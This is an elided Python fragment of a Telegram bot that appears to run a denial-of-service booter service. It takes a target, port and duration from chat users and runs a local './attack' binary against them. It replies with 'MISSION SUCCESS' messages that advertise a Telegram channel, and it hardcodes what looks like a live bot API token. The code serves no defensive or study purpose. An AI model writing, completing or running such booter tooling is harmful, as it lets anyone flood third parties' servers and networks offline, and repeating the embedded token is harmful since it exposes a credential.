...
bot = telebot.TeleBot('7780226730:AAE7TOj_shcloKfpgKtLnuYI5edKUs8SywQ')
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./attack {target} {port} {attack_time} "  # ✅ Correct variable name
...
def send_attack_finished_message(chat_id, message_id, target, port, attack_time):
    ...
    message = (
        ...
        "💀 **STATUS:** **`SUCCESS!`**\n\n"
        "💀 **MISSION SUCCESS!** 💀
        AB ISI BAAT PAR CHANNEL JOIN KARO https://t.me/+eqgZLtwSaj1kZmY1"
    )
